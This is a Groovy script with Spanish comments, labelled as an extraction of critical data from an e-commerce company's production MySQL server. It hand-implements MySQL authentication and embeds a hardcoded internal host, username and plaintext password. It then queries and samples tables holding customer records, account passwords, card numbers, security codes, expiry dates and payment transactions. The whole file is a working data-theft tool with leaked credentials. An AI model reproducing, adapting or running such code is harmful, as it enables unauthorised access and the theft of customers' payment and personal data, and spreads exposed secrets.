// Extraer datos CRÍTICOS de ClaroShop PROD (172.27.140.151:3306) - dbapipedidoscsb
// GRANT SELECT, INSERT, UPDATE, DELETE ON *.* — acceso total

import java.net.Socket
import java.net.InetSocketAddress
import java.security.MessageDigest

class CsP2 { byte[] d; int i = 0
  long le() { int b=d[i]&0xFF;i++;if(b<0xFB)return(long)b;if(b==0xFC){long v=(d[i]&0xFF)|((d[i+1]&0xFF)<<8);i+=2;return v};if(b==0xFD){long v=(d[i]&0xFF)|((d[i+1]&0xFF)<<8)|((d[i+2]&0xFF)<<16);i+=3;return v};long v=0;for(int k=0;k<8;k++){v|=((long)(d[i+k]&0xFF))<<(8*k)};i+=8;return v}
  String ls() { int fb=d[i]&0xFF;if(fb==0xFB){i++;return null};long l=le();String s=new String(d,i,(int)l,'UTF-8');i+=(int)l;return s }
}
class QCsP2 {
  DataInputStream ins; BufferedOutputStream outs; Socket sock
  byte[] rp() { int len=(ins.readUnsignedByte())|(ins.readUnsignedByte()<<8)|(ins.readUnsignedByte()<<16);ins.readUnsignedByte();byte[] pl=new byte[len];ins.readFully(pl);return pl }
  void wp(int seq,byte[] pl) { int len=pl.length;outs.write(len&0xFF);outs.write((len>>8)&0xFF);outs.write((len>>16)&0xFF);outs.write(seq&0xFF);outs.write(pl);outs.flush() }
  boolean auth(String host,int port,String user,String pass) {
    try {
      sock=new Socket();sock.connect(new InetSocketAddress(host,port),5000);sock.setSoTimeout(20000)
      ins=new DataInputStream(new BufferedInputStream(sock.getInputStream()));outs=new BufferedOutputStream(sock.getOutputStream())
      byte[] p=rp();if((p[0]&0xFF)!=10)return false
      int i=1;while(p[i]!=0){i++};i++;i+=4
      byte[] s1=new byte[8];System.arraycopy(p,i,s1,0,8);i+=8;i++;i+=2;i++;i+=2;i+=2
      int aLen=(p[i]&0xFF);i++;i+=10;int s2Len=Math.max(13,aLen-8);def s2l=[];int av=p.length-i
      for(int k=0;k<Math.min(s2Len,av);k++){if(p[i+k]!=0)s2l.add(p[i+k])}
      byte[] seed=new byte[8+s2l.size()];System.arraycopy(s1,0,seed,0,8);for(int k=0;k<s2l.size();k++)seed[8+k]=(byte)s2l[k]
      def md=MessageDigest.getInstance('SHA-1');byte[] h1=md.digest(pass.getBytes('UTF-8'));byte[] h2=md.digest(h1)
      md.reset();md.update(seed);md.update(h2);byte[] h3=md.digest()
      byte[] tok=new byte[20];for(int j=0;j<20;j++)tok[j]=(byte)((h1[j]^h3[j])&0xFF)
      int caps=0x1|0x200|0x2000|0x8000|0x80000|0x20000
      ByteArrayOutputStream b=new ByteArrayOutputStream()
      b.write(caps&0xFF);b.write((caps>>8)&0xFF);b.write((caps>>16)&0xFF);b.write((caps>>24)&0xFF)
      b.write(0);b.write(0);b.write(0);b.write(1);b.write(33);b.write(new byte[23])
      b.write(user.getBytes('UTF-8'));b.write(0);b.write(tok.length);b.write(tok);b.write('mysql_native_password'.getBytes('UTF-8'));b.write(0)
      wp(1,b.toByteArray());byte[] ap=rp();return((ap[0]&0xFF)==0x00)
    } catch(Exception e) { return false }
  }
  String q(String sql) {
    try {
      ByteArrayOutputStream qb=new ByteArrayOutputStream();qb.write(0x03);qb.write(sql.getBytes('UTF-8'))
      wp(0,qb.toByteArray());byte[] r=rp();int b0=r[0]&0xFF
      if(b0==0xFF){int code=(r[1]&0xFF)|((r[2]&0xFF)<<8);return "ERR_${code}: "+new String(r,3,r.length-3,'UTF-8')}
      if(b0==0x00)return "OK"
      CsP2 c0=new CsP2(d:r);long cc=c0.le()
      def cols=[];(0..<cc).each{byte[] cp=rp();CsP2 cc2=new CsP2(d:cp);4.times{cc2.ls()};cols.add(cc2.ls())}
      rp()
      def rows=[];int guard=0
      while(guard++<500){byte[] r2=rp();int rb=r2[0]&0xFF;if(rb==0xFE&&r2.length<9)break;if(rb==0xFF){rows.add(["ROWERR"]);break};CsP2 rc=new CsP2(d:r2);def vals=[];(0..<cc).each{def v=rc.ls();vals.add(v==null?"NULL":v.take(200))};rows.add(vals)}
      StringBuilder res=new StringBuilder();res.append("COLS["+cols.join("|")+"]\n");rows.each{res.append("ROW["+it.join("|")+"]\n")};return res.toString()
    } catch(Exception e) { return "QERR: "+e.getMessage() }
  }
  void close(){try{sock?.close()}catch(Exception ignored){}}
}

def H='172.27.140.151'; def P=3306; def U='dbapipedidoscsb'; def PW='YF8v{%dvupN3V1%T'

def qry = { String sql ->
  def mc = new QCsP2()
  try {
    if(!mc.auth(H,P,U,PW)) return "AUTH_FAIL"
    def r=mc.q(sql); mc.close(); return r
  } catch(Exception e) { try{mc.close()}catch(Exception ignored){}; return "EXC: "+e.getMessage() }
}

// 1. Contar tablas críticas en tienda (PROD ClaroShop)
println "=== COUNTS tienda PROD ClaroShop ==="
['pedidos','clientes','clientescontrasena','datostarjeta','cybersource_transacciones',
 'pedidos_datos_pago','datos_pedido','datos_clientes','payment_claropay','usuarios'].each { tbl ->
  def r = qry("SELECT COUNT(*) FROM tienda.${tbl}")
  println "  ${tbl}: ${r}"
}

// 2. SCHEMA de pedidos para ver si hay datos de tarjeta
println "\n=== SCHEMA tienda.pedidos (cols con tarjeta) ==="
println qry("SELECT COLUMN_NAME,COLUMN_TYPE FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='tienda' AND TABLE_NAME='pedidos' AND (COLUMN_NAME LIKE '%tarj%' OR COLUMN_NAME LIKE '%card%' OR COLUMN_NAME LIKE '%numer%' OR COLUMN_NAME LIKE '%cvv%' OR COLUMN_NAME LIKE '%segur%' OR COLUMN_NAME LIKE '%expir%' OR COLUMN_NAME LIKE '%mes%' OR COLUMN_NAME LIKE '%ao%') ORDER BY ORDINAL_POSITION")

// 3. Muestra pedidos recientes
println "\n=== SAMPLE pedidos PROD (últimos 5) ==="
println qry("SELECT Id,Cliente,Fecha_Inicio,tipotarjeta,nombre,numero,mes,ao,seguridad,total,ip FROM tienda.pedidos ORDER BY Id DESC LIMIT 5")

// 4. pedidos con tarjeta (numero not null)
println "\n=== COUNT pedidos CON tarjeta ==="
println qry("SELECT COUNT(*) FROM tienda.pedidos WHERE numero IS NOT NULL AND numero!='' AND numero!='0'")

// 5. Muestra clientes
println "\n=== SAMPLE clientes PROD (últimos 5) ==="
println qry("SELECT Id,Nombre,Apellido_Paterno,Email,Password,num_celular,fecha_creacion FROM tienda.clientes ORDER BY Id DESC LIMIT 5")

// 6. payment_t1 en PROD ClaroShop
println "\n=== payment_t1 TABLES/COUNTS ==="
println qry("SELECT TABLE_NAME,TABLE_ROWS FROM information_schema.TABLES WHERE TABLE_SCHEMA='payment_t1' ORDER BY TABLE_ROWS DESC")

// 7. pedidos_datos_pago schema
println "\n=== SCHEMA pedidos_datos_pago ==="
println qry("SELECT COLUMN_NAME,COLUMN_TYPE FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='tienda' AND TABLE_NAME='pedidos_datos_pago' ORDER BY ORDINAL_POSITION LIMIT 20")

println "\n=== SAMPLE pedidos_datos_pago ==="
println qry("SELECT * FROM tienda.pedidos_datos_pago ORDER BY id DESC LIMIT 5")

// 8. cybersource_transacciones - tienen tarjetas parciales?
println "\n=== COUNT cybersource_transacciones ==="
println qry("SELECT COUNT(*) FROM tienda.cybersource_transacciones")

println "\n=== SAMPLE cybersource_transacciones (últimas) ==="
println qry("SELECT request_id,id_pedido,tipo_targeta,targeta_numero,total,decision,fecha FROM tienda.cybersource_transacciones ORDER BY fecha DESC LIMIT 10")

// 9. selfservice (120 tablas) - qué hay ahí?
println "\n=== selfservice KEY TABLES ==="
println qry("SELECT TABLE_NAME,TABLE_ROWS FROM information_schema.TABLES WHERE TABLE_SCHEMA='selfservice' AND TABLE_ROWS > 0 ORDER BY TABLE_ROWS DESC LIMIT 20")

// 10. monedero
println "\n=== monedero TABLES ==="
println qry("SELECT TABLE_NAME,TABLE_ROWS FROM information_schema.TABLES WHERE TABLE_SCHEMA='monedero' ORDER BY TABLE_ROWS DESC")

println "=== FIN CLAROSHOP PROD EXTRACT ==="
